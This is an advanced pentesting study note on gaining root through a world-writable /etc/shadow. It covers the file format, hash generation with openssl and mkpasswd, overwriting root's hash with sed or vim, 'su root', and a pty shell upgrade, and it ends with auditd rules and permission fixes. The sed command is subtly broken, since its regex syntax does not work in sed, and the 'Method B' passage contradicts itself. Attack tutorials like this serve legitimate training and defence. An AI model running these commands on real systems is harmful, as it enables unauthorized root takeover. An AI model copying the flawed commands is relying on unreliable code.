---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.08 Writable etc shadow"
---

# Writable /etc/shadow Privilege Escalation

## Executive Summary

The `/etc/shadow` file in Linux systems is a critical component of the local authentication mechanism. It stores the encrypted passwords (hashes) of user accounts, along with password aging and expiration information. By default, this file is highly restricted, readable only by the `root` user or members of the `shadow` group. However, misconfigurations or improper file permissions can inadvertently render the `/etc/shadow` file writable by unprivileged users. When an attacker encounters a writable `/etc/shadow` file, it presents a direct, trivial, and highly reliable path to root privilege escalation. The attacker can simply replace the existing root password hash with a known hash of their choosing, or append a new user with root privileges, effectively seizing control of the system.

## Deep Dive into /etc/shadow

### Structure and Format

The `/etc/shadow` file consists of nine colon-separated fields per line, representing the properties of a specific user account. Understanding this structure is crucial for a successful exploit, as a malformed entry can lock out all users, including the attacker.

The format is as follows:
`username:password_hash:last_change:min_age:max_age:warn:inactive:expire:reserved`

1. **username**: The exact login name of the account.
2. **password_hash**: The encrypted password. It typically starts with an identifier for the hashing algorithm (e.g., `$6$` for SHA-512). If this field is `*` or `!`, the account cannot be used for password-based logins.
3. **last_change**: The date the password was last changed (measured in days since the Unix Epoch, Jan 1, 1970).
4. **min_age**: The minimum number of days required between password changes.
5. **max_age**: The maximum number of days the password is valid before a change is forced.
6. **warn**: The number of days before expiration that the user is warned.
7. **inactive**: The number of days after expiration before the account is permanently disabled.
8. **expire**: The absolute date (days since Epoch) when the account expires.
9. **reserved**: Reserved for future use.

### Hashing Algorithms

The `password_hash` field relies on robust hashing algorithms to protect against cracking. Linux uses a specific prefix structure to denote the algorithm in use:

*   `$1$`: MD5 (Legacy, highly vulnerable to cracking)
*   `$2a$`, `$2y$`: Blowfish (bcrypt) (Common in BSD and some Linux distributions)
*   `$5$`: SHA-256 (Secure, but faster to compute than SHA-512)
*   `$6$`: SHA-512 (Standard on most modern Linux systems)
*   `$y$`: yescrypt (Increasingly default on newer distributions like Debian 11+ and Ubuntu 22.04+)

For exploitation, the attacker does not need to crack the existing hash. They only need to generate a new hash using one of these algorithms and inject it.

### Permissions Misconfiguration

A secure system will have `/etc/shadow` permissions set to `0640` or `0600`, owned by `root` and group `root` or `shadow`.

```bash
# Secure configuration
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1234 Jan 01 12:00 /etc/shadow
```

A vulnerable system might have permissions set to `0666` or be owned by a group the attacker is a member of with write access (e.g., `0664`).

```bash
# Vulnerable configuration
$ ls -l /etc/shadow
-rw-rw-rw- 1 root root 1234 Jan 01 12:00 /etc/shadow
```

## The Vulnerability

The vulnerability stems directly from the Linux Pluggable Authentication Modules (PAM) relying completely on the integrity of `/etc/shadow` for local user authentication via `su`, `sudo`, or console login. If an unprivileged user has write access, the operating system's fundamental security model is compromised. 

Common causes of this misconfiguration include:
*   Inexperienced system administrators inadvertently running `chmod 666 /etc/shadow` while troubleshooting.
*   Automated configuration management tools (Ansible, Puppet, Chef) deploying incorrect templates.
*   Custom setup scripts failing to properly revert permissions after modifying the file.
*   Containerized environments where the host's `/etc` is mounted into the container with overly permissive rights.

## Attack Flow Architecture

```ascii
+-----------------------+
|  Unprivileged Shell   |
|  (Attacker Access)    |
+-----------+-----------+
            |
            | 1. Checks permissions
            v
+-----------------------+        2. Generates payload       +-------------------+
|  File: /etc/shadow    | <-------------------------------- |  Local Machine /  |
|  Permissions: 0666    |                                   |  Attacker System  |
+-----------+-----------+                                   +-------------------+
            |                                                      |
            | 3. Overwrites root hash                              |
            v                                                      |
+-----------------------+                                          |
|  Modified /etc/shadow |                                          |
|  root:$6$newhash:...  |                                          |
+-----------+-----------+                                          |
            |                                                      |
            | 4. Executes 'su root'                                |
            v                                                      |
+-----------------------+                                          |
|      PAM Module       | <----------------------------------------+
|  Verifies new hash    |    5. Provides known password
+-----------+-----------+
            |
            | 6. Authentication Success
            v
+-----------------------+
|      Root Shell       |
|      (uid=0)          |
+-----------------------+
```

## Exploitation Phase

The exploitation process consists of generating a new hash and overwriting the target file. It is generally safer to edit the file using a tool like `sed` or by downloading, modifying, and uploading it, rather than risking a malformed entry using a basic text editor.

### Step 1: Generate a New Hash

The attacker needs to generate a hash for a password they know. The easiest method is using `openssl passwd` or `mkpasswd`.

Using `openssl` (SHA-512):
```bash
$ openssl passwd -6 -salt salt123 'newpassword'
$6$salt123$1a2b3c4d5e6f7g8h...
```

Using `mkpasswd` (SHA-512):
```bash
$ mkpasswd -m sha-512 'newpassword'
$6$xyz123$9a8b7c6d5e4f...
```

### Step 2: Inject the Hash

#### Method A: Replacing the Root Hash directly

If the file is directly writable, you can replace the hash on the root line.

1.  Read the current root line:
    ```bash
    $ grep root /etc/shadow
    root:$6$oldhash...:18000:0:99999:7:::
    ```

2.  Modify the line to insert the new hash:
    ```bash
    $ sed -i 's/^root:.*?:/root:$6$salt123$1a2b3c4d5e6f7g8h...:/' /etc/shadow
    ```

#### Method B: Appending a New Root User

A safer method that doesn't disrupt the existing root account (avoiding detection or system instability) is to append a new user with UID 0. To do this, `/etc/passwd` must also be modified, but if only `/etc/shadow` is writable, this method won't work perfectly for a full login, but replacing the root hash is the standard approach.

Assuming we are just modifying `/etc/shadow`:
```bash
# We overwrite the root entry using nano or vim if interactive, or echo if not.
# Backup the file first if possible (though rarely an option without root, but you can read it!)
$ cp /etc/shadow /tmp/shadow.bak
$ vim /etc/shadow
# Replace the hash for root.
```

### Step 3: Escalate Privileges

Once the hash is modified, the attacker simply switches to the root user.

```bash
$ su root
Password: newpassword
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Edge Cases & Troubleshooting

### Interactive vs. Non-Interactive Shells
If you are operating in a reverse shell without a fully interactive TTY, the `su root` command might fail with errors like `su: must be run from a terminal`.

**Solution:** Upgrade the shell to a full TTY using Python before attempting to use `su`.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Read-Only File Systems
If the permissions are `0666` but the filesystem is mounted read-only, you will receive a "Read-only file system" error.
**Solution:** Check if the file system can be remounted, though this usually requires root. If not, this vector is not viable.

### The Immutable Flag
Even with `0666` permissions, a file might have the immutable attribute set (`+i`).
**Solution:** Check attributes using `lsattr /etc/shadow`. If it has `i`, it cannot be modified. Only root can remove the immutable flag using `chattr -i`, so this stops the exploit.

## Detection and Forensics

Detecting modifications to `/etc/shadow` is a critical security monitoring task.

1.  **Auditd Rules**: Implement auditd rules to monitor any write access to the file.
    ```bash
    -w /etc/shadow -p wa -k shadow_modifications
    ```
    This will generate logs in `/var/log/audit/audit.log` whenever the file is modified or its attributes are changed.

2.  **File Integrity Monitoring (FIM)**: Tools like AIDE, OSSEC, or Wazuh will hash `/etc/shadow` periodically. A sudden change in the file hash outside of an expected maintenance window triggers a high-priority alert.

3.  **SIEM Queries**: Look for sudden usage of `su root` from unexpected users, especially immediately following a write event to `/etc/shadow`.

## Remediation

Remediation is straightforward: enforce strict permissions on the shadow file.

1.  Set ownership to `root:shadow`.
    ```bash
    sudo chown root:shadow /etc/shadow
    ```

2.  Set permissions to `0640` or `0600`.
    ```bash
    sudo chmod 640 /etc/shadow
    ```

3.  Review automation scripts and deployment templates to ensure they do not alter these permissions.
4.  Conduct a system audit to determine how the file permissions were altered in the first place, as this may indicate a prior compromise or a severe administrative error.

## Chaining Opportunities

*   **[[07 - Writable etc passwd]]**: Often, if `/etc/shadow` is misconfigured, `/etc/passwd` might also be, allowing for the creation of new UID 0 users without even touching the shadow file.
*   **[[21 - Sudo Misconfigurations]]**: If the attacker cannot get an interactive shell for `su`, they might look for sudo misconfigurations that allow executing binaries that can read the newly written password or execute commands as root without the interactive prompt.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[07 - Writable etc passwd]]
*   [[06 - Clear Text Credentials]]
*   [[22 - Linux Authentication Mechanisms]]
